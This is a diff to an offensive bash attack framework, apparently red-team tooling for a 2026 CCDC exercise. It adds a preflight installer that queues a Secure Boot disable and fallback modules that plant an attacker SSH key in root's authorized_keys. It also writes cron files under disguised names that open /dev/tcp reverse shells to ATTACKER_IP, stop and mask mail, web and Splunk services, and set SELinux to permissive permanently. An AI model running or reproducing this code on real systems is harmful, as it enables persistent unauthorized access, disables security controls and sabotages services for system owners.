@@ -208,6 +208,99 @@ print_state_table() {
     echo
 }
 
+# ── Preflight dependency installer ───────────────────────────────────────────
+# Runs once before any module. Releases apt/dpkg locks, does a single package
+# update, and installs everything all modules might need (gcc, make, docker,
+# kernel headers) so individual modules never race the package manager or hit
+# a stale cache. Also queues a Secure Boot disable via mokutil if SB is on.
+preflight_deps() {
+    info "=== Preflight: Installing core dependencies ==="
+    local KVER; KVER="$(uname -r)"
+
+    case "${DISTRO}" in
+        ubuntu)
+            export DEBIAN_FRONTEND=noninteractive
+
+            # Release any locks left by unattended-upgrades or an interrupted run
+            local _lf
+            for _lf in /var/lib/dpkg/lock-frontend /var/lib/dpkg/lock \
+                        /var/cache/apt/archives/lock /var/lib/apt/lists/lock; do
+                [[ -f "$_lf" ]] && rm -f "$_lf" || true
+            done
+            dpkg --configure -a 2>/dev/null || true
+
+            info "apt-get update..."
+            apt-get update -qq 2>/dev/null || warn "apt-get update failed — trying installs anyway"
+
+            info "Installing gcc, make, curl, docker.io, e2fsprogs..."
+            apt-get install -y -q gcc make curl docker.io e2fsprogs 2>/dev/null || \
+                warn "Some core packages failed — affected modules will use fallbacks"
+
+            info "Installing kernel headers for ${KVER}..."
+            apt-get install -y -q "linux-headers-${KVER}" 2>/dev/null || \
+                apt-get install -y -q linux-headers-generic 2>/dev/null || \
+                warn "Kernel headers unavailable — KernelSneak will use LD_PRELOAD fallback"
+
+            systemctl enable --now docker 2>/dev/null || true
+            ;;
+
+        fedora|rhel)
+            info "Installing gcc, make, curl..."
+            dnf install -y -q gcc make curl 2>/dev/null || \
+                warn "Some core packages failed — affected modules will use fallbacks"
+
+            info "Installing kernel headers for ${KVER}..."
+            # Oracle Linux may run the UEK (Unbreakable Enterprise Kernel); its
+            # headers are in kernel-uek-devel, not kernel-devel.
+            if echo "${KVER}" | grep -q "uek"; then
+                dnf install -y -q "kernel-uek-devel-${KVER}" 2>/dev/null || \
+                    dnf install -y -q kernel-uek-devel 2>/dev/null || \
+                    warn "UEK kernel headers unavailable — KernelSneak will use LD_PRELOAD fallback"
+            else
+                dnf install -y -q "kernel-devel-${KVER}" 2>/dev/null || \
+                    dnf install -y -q kernel-devel 2>/dev/null || \
+                    warn "Kernel headers unavailable — KernelSneak will use LD_PRELOAD fallback"
+            fi
+
+            if ! command -v docker &>/dev/null; then
+                info "Attempting Docker CE install..."
+                dnf -y install -q dnf-plugins-core 2>/dev/null || true
+                dnf config-manager --add-repo \
+                    https://download.docker.com/linux/fedora/docker-ce.repo 2>/dev/null || true
+                dnf install -y -q docker-ce docker-ce-cli containerd.io 2>/dev/null || \
+                    warn "Docker CE unavailable for this Fedora version — will use Podman fallback"
+                systemctl enable --now docker 2>/dev/null || true
+            fi
+            ;;
+    esac
+
+    # Secure Boot — queue disable now so the NEXT boot allows the LKM
+    if command -v mokutil &>/dev/null; then
+        if mokutil --sb-state 2>/dev/null | grep -qi "enabled"; then
+            warn "Secure Boot ENABLED — queuing disable via mokutil..."
+            printf 'ccdc2026\nccdc2026\n' | mokutil --disable-validation 2>/dev/null && \
+                warn "  SB disable queued (pw: ccdc2026) — confirm at MOK manager on next reboot" || \
+                warn "  mokutil disable failed — disable manually in BIOS/UEFI"
+            warn "  KernelSneak will use LD_PRELOAD fallback for THIS session"
+        fi
+    fi
+
+    echo
+    info "Preflight status:"
+    command -v gcc    &>/dev/null \
+        && success "  gcc:            $(gcc --version 2>/dev/null | head -1)" \
+        || warn    "  gcc:            NOT AVAILABLE — compile modules will use fallbacks"
+    command -v docker &>/dev/null \
+        && success "  docker:         available" \
+        || { command -v podman &>/dev/null \
+             && info "  docker:         absent — podman available (fallback ready)" \
+             || warn "  docker/podman:  NOT AVAILABLE — payloads applied directly"; }
+    [[ -d "/lib/modules/${KVER}/build" ]] \
+        && success "  kernel headers: available ($(ls /lib/modules/${KVER}/build/Makefile 2>/dev/null && echo ok))" \
+        || warn    "  kernel headers: NOT AVAILABLE — KernelSneak → LD_PRELOAD fallback"
+    echo
+}
+
 # ── Module runner ─────────────────────────────────────────────────────────────
 FORCE=0
 
@@ -274,13 +367,14 @@ run_rootkit() {
         return 0
     fi
 
-    # Secure Boot check
+    # Secure Boot check — fail fast so the LD_PRELOAD fallback kicks in now
     if command -v mokutil &>/dev/null; then
         local sb_state
         sb_state=$(mokutil --sb-state 2>/dev/null || echo "unknown")
         if echo "${sb_state}" | grep -qi "enabled"; then
-            warn "Secure Boot is ENABLED — unsigned module will be rejected."
-            warn "Disable in BIOS/UEFI then re-run. Continuing anyway..."
+            err "Secure Boot is ENABLED — unsigned LKM will be rejected by kernel"
+            err "Queued SB disable in preflight; use LD_PRELOAD fallback this session"
+            return 1
         fi
     fi
 
@@ -293,9 +387,14 @@ run_rootkit() {
             apt-get install -y -q "linux-headers-${KERNEL_VER}" gcc make
             ;;
         fedora|rhel)
-            if ! dnf install -y "kernel-devel-${KERNEL_VER}" gcc make 2>/dev/null; then
-                warn "Exact kernel-devel-${KERNEL_VER} not found — falling back to latest"
-                dnf install -y kernel-devel gcc make
+            if echo "${KERNEL_VER}" | grep -q "uek"; then
+                dnf install -y "kernel-uek-devel-${KERNEL_VER}" gcc make 2>/dev/null || \
+                    dnf install -y kernel-uek-devel gcc make 2>/dev/null || true
+            else
+                dnf install -y "kernel-devel-${KERNEL_VER}" gcc make 2>/dev/null || {
+                    warn "Exact kernel-devel-${KERNEL_VER} not found — falling back to latest"
+                    dnf install -y kernel-devel gcc make 2>/dev/null || true
+                }
             fi
             ;;
     esac
@@ -758,6 +857,96 @@ DOCKERFILE
 }
 
 # =============================================================================
+# MODULE 2 FALLBACK: docker_poisoner_fallback — Podman / Direct Host Apply
+# =============================================================================
+# Triggered when DockerPoisoner fails — typically Docker CE repo missing packages
+# for the running Fedora version (e.g. Fedora 43 released before Docker adds it).
+# Strategy 1: Podman (ships with Fedora, compatible CLI).
+# Strategy 2: Apply SSH key + cron payloads directly to the host — the container
+#             was only a delivery vehicle; the payloads were always host-side files.
+run_docker_poisoner_fallback() {
+    local CONTAINER_NAME="docker-metrics-agent"
+    local IMAGE_NAME="docker-metrics-agent:latest"
+    local CRON_REVSHELL_NAME="system-certs-update"
+    local CRON_KILLER_NAME="system-svc-maintenance"
+
+    info "=== DockerPoisoner Fallback — Podman / Direct Host Apply ==="
+
+    # ── Strategy 1: Podman ─────────────────────────────────────────────────────
+    if command -v podman &>/dev/null; then
+        info "Podman available — attempting Podman container"
+        local BUILD_DIR
+        BUILD_DIR="$(mktemp -d)"
+        trap 'rm -rf "${BUILD_DIR}"' RETURN
+
+        cat > "${BUILD_DIR}/entrypoint.sh" << ENTRYEOF
+#!/bin/bash
+mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh
+grep -qF "${ATTACKER_SSH_PUBKEY}" /host/root/.ssh/authorized_keys 2>/dev/null || \
+    printf '%s\n' "${ATTACKER_SSH_PUBKEY}" >> /host/root/.ssh/authorized_keys
+chmod 600 /host/root/.ssh/authorized_keys
+printf 'SHELL=/bin/bash\n*/15 * * * * root bash -i >& /dev/tcp/${ATTACKER_IP}/${DOCKER_PORT} 0>&1\n' \
+    > /host/etc/cron.d/${CRON_REVSHELL_NAME}
+chmod 644 /host/etc/cron.d/${CRON_REVSHELL_NAME}
+printf 'SHELL=/bin/bash\n*/3 * * * * root systemctl stop postfix dovecot apache2 httpd splunk 2>/dev/null; systemctl mask postfix dovecot apache2 httpd splunk 2>/dev/null\n' \
+    > /host/etc/cron.d/${CRON_KILLER_NAME}
+chmod 644 /host/etc/cron.d/${CRON_KILLER_NAME}
+exec tail -f /dev/null
+ENTRYEOF
+
+        cat > "${BUILD_DIR}/Containerfile" << 'CFILE'
+FROM fedora:latest
+RUN dnf install -y bash && dnf clean all
+COPY entrypoint.sh /entrypoint.sh
+RUN chmod +x /entrypoint.sh
+ENTRYPOINT ["/entrypoint.sh"]
+CFILE
+
+        if podman build --no-cache -t "${IMAGE_NAME}" "${BUILD_DIR}" 2>/dev/null; then
+            podman rm -f "${CONTAINER_NAME}" 2>/dev/null || true
+            if podman run -d --name "${CONTAINER_NAME}" \
+                --restart=always --privileged -v /:/host \
+                "${IMAGE_NAME}" 2>/dev/null; then
+                sleep 3
+                if [[ -f "/etc/cron.d/${CRON_REVSHELL_NAME}" ]]; then
+                    success "DockerPoisoner fallback via Podman:"
+                    success "  Container  → podman ps | grep ${CONTAINER_NAME}"
+                    success "  Rev shell  → /etc/cron.d/${CRON_REVSHELL_NAME}"
+                    success "  Svc killer → /etc/cron.d/${CRON_KILLER_NAME}"
+                    return 0
+                fi
+            fi
+        fi
+        warn "Podman container failed — falling through to direct host apply"
+    else
+        info "Podman not found — going straight to direct host apply"
+    fi
+
+    # ── Strategy 2: Direct host apply (no container) ───────────────────────────
+    info "Applying DockerPoisoner payloads directly to host..."
+
+    mkdir -p /root/.ssh && chmod 700 /root/.ssh
+    grep -qF "${ATTACKER_SSH_PUBKEY}" /root/.ssh/authorized_keys 2>/dev/null || \
+        printf '%s\n' "${ATTACKER_SSH_PUBKEY}" >> /root/.ssh/authorized_keys
+    chmod 600 /root/.ssh/authorized_keys
+
+    printf 'SHELL=/bin/bash\n*/15 * * * * root bash -i >& /dev/tcp/%s/%s 0>&1\n' \
+        "${ATTACKER_IP}" "${DOCKER_PORT}" \
+        > "/etc/cron.d/${CRON_REVSHELL_NAME}"
+    chmod 644 "/etc/cron.d/${CRON_REVSHELL_NAME}"
+
+    printf 'SHELL=/bin/bash\n*/3 * * * * root systemctl stop postfix dovecot apache2 httpd splunk 2>/dev/null; systemctl mask postfix dovecot apache2 httpd splunk 2>/dev/null\n' \
+        > "/etc/cron.d/${CRON_KILLER_NAME}"
+    chmod 644 "/etc/cron.d/${CRON_KILLER_NAME}"
+
+    success "DockerPoisoner payloads applied directly (no container):"
+    success "  SSH key    → /root/.ssh/authorized_keys"
+    success "  Rev shell  → /etc/cron.d/${CRON_REVSHELL_NAME}  (every 15 min → ${ATTACKER_IP}:${DOCKER_PORT})"
+    success "  Svc killer → /etc/cron.d/${CRON_KILLER_NAME}  (every 3 min)"
+    warn    "  Note       → cron files are directly visible (no container stealth layer)"
+}
+
+# =============================================================================
 # MODULE 3: preosboot — BootStrap (T1542.001)
 # =============================================================================
 run_preosboot() {
@@ -1033,6 +1222,19 @@ run_process_inject() {
 
     info "=== PTraced — T1055.008 Process Injection ==="
 
+    # Disable SELinux if enforcing — it blocks PTRACE_ATTACH on RHEL/Oracle/Fedora
+    # even as root with ptrace_scope=0. Do this before compilation so the whole
+    # module succeeds rather than falling to the cron-only fallback.
+    if command -v getenforce &>/dev/null && \
+       [[ "$(getenforce 2>/dev/null || echo 'N/A')" == "Enforcing" ]]; then
+        info "SELinux Enforcing detected — setting permissive for ptrace..."
+        setenforce 0 2>/dev/null || warn "setenforce 0 failed — ptrace may still be blocked"
+        if [[ -f /etc/selinux/config ]]; then
+            sed -i 's/^SELINUX=enforcing/SELINUX=permissive/' /etc/selinux/config
+            success "SELinux set to permissive (persists on reboot)"
+        fi
+    fi
+
     # Install gcc
     if ! command -v gcc &>/dev/null; then
         info "Installing gcc..."
@@ -1262,6 +1464,63 @@ EOF
     success "  Injected    → ${TARGET_NAME} PID ${TARGET_PID}"
     success "  Rev shell   → ${ATTACKER_IP}:${PTRACE_PORT}"
     success "  Cron killer → ${CRON_FILE} (every 10 min)"
+}
+
+# =============================================================================
+# MODULE 4 FALLBACK: process_inject_fallback — SELinux Bypass + Cron Payload
+# =============================================================================
+# Triggered when PTraced fails — on Fedora/RHEL, SELinux enforcing blocks
+# PTRACE_ATTACH even as root even with ptrace_scope=0.
+# Strategy 1: Disable SELinux enforcement (setenforce 0 + persist in config).
+#             This is a bonus side effect — permissive SELinux helps everything.
+# Strategy 2: Drop the service-killer and reverse-shell cron files directly.
+#             The ptrace injection fires a one-shot shell; the crons are the
+#             persistent mechanism — we get the same net effect without injection.
+run_process_inject_fallback() {
+    local CRON_FILE="/etc/cron.d/systemd-coredump-helper"
+
+    info "=== PTraced Fallback — SELinux Disable + Direct Cron Payload ==="
+
+    # ── Strategy 1: Neutralise SELinux ────────────────────────────────────────
+    if command -v getenforce &>/dev/null; then
+        local selinux_state
+        selinux_state="$(getenforce 2>/dev/null || echo 'Disabled')"
+        if [[ "${selinux_state}" == "Enforcing" ]]; then
+            warn "SELinux is Enforcing — disabling (likely caused ptrace failure)"
+            setenforce 0 2>/dev/null || warn "setenforce 0 failed — continuing anyway"
+            # Persist permissive across reboots
+            if [[ -f /etc/selinux/config ]]; then
+                sed -i 's/^SELINUX=enforcing/SELINUX=permissive/' /etc/selinux/config
+                success "SELinux set to permissive (persists on reboot)"
+            fi
+        else
+            info "SELinux is ${selinux_state} — ptrace block was something else"
+        fi
+    fi
+
+    # ── Strategy 2: Drop cron payloads directly ───────────────────────────────
+    info "Dropping persistent cron payloads..."
+
+    local CRON_CMD=""
+    for svc in dovecot postfix opencart apache2 httpd splunk; do
+        CRON_CMD+="systemctl stop ${svc} 2>/dev/null; systemctl mask ${svc} 2>/dev/null; "
+    done
+
+    cat > "${CRON_FILE}" << EOF
+# systemd core dump handler — kernel coredump notification relay
+SHELL=/bin/bash
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+*/10 * * * *  root  ${CRON_CMD}
+*/20 * * * *  root  bash -c 'bash -i >& /dev/tcp/${ATTACKER_IP}/${PTRACE_PORT} 0>&1'
+EOF
+    chmod 644 "${CRON_FILE}"
+
+    success "PTraced fallback deployed:"
+    success "  Svc killer → ${CRON_FILE} (every 10 min)"
+    success "  Rev shell  → ${ATTACKER_IP}:${PTRACE_PORT} (every 20 min via cron)"
+    warn    "  Note       → no live injection; first shell fires in ≤20 min"
+    warn    "  Tip        → re-run module 4 with [f] force now that SELinux is permissive"
 }
 
 # =============================================================================
@@ -2189,6 +2448,7 @@ run_section_interactive() {
 main() {
     detect_distro
     init_state
+    preflight_deps
 
     # Parse args
     local MODE="menu"
